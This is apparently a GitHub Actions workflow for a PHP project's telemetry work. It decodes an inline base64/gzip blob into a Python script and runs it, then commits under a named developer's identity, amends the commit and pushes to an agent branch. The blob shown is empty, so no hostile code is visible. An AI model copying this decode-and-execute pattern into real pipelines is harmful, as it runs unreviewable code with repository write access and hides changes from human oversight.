name: Telemetry Runner 4

on:
  push:
    branches:
      - agent/telemetry-audit-live
    paths:
      - '.github/workflows/telemetry-runner4.yml'

permissions:
  contents: write

jobs:
  implement:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          ref: agent/telemetry-audit-live
          fetch-depth: 0
      - uses: shivammathur/setup-php@v2
        with:
          php-version: '8.4'
          coverage: none
          tools: none
      - name: Implement telemetry
        shell: bash
        run: |
          set -euo pipefail
          printf '%s' '' | base64 -d | gzip -dc > /tmp/telemetry-implement.py
          python3 /tmp/telemetry-implement.py
          for file in app/Infrastructure/SupportTelemetry/SupportTelemetryInfrastructureOperations01.php app/Infrastructure/SupportTelemetry/SupportTelemetryInfrastructureOperations02.php app/Infrastructure/SupportTelemetry/SupportTelemetryInfrastructureOperations03.php app/Runtime/SupportTelemetry/SupportTelemetryRuntimeOperations01.php app/Runtime/AdminPages/AdminPagesRuntimeOperations02.php app/Runtime/AdminPages/AdminPagesRuntimeOperations03.php app/Presentation/AdminPages/AdminPagesPresentationOperations03.php cron/maestro.php; do php -l "$file" >/dev/null; done
          php tools/database-record-telemetry-contract-check
          php tools/page-load-telemetry-contract-check
          git diff --check
          git config user.name 'Wesley Ferreira'
          git config user.email '48494254+drwesleyadv@users.noreply.github.com'
          git add app cron tools version.json
          git commit -m 'fix(telemetry): make 30-day views and records coherent'
          echo READY_FOR_REMOTE_CLEANUP
          sleep 75
          git fetch origin +refs/heads/agent/telemetry-audit-live:refs/remotes/origin/agent/telemetry-audit-live
          git rebase origin/agent/telemetry-audit-live
          php tools/release-contract-reconcile --write
          php tools/release-contract-reconcile --write
          php tools/release-contract-reconcile --write
          php tools/release-contract-reconcile --check
          php tools/architecture-check.php
          git diff --check
          git add -A
          git commit --amend --no-edit
          git push origin HEAD:agent/telemetry-audit-live
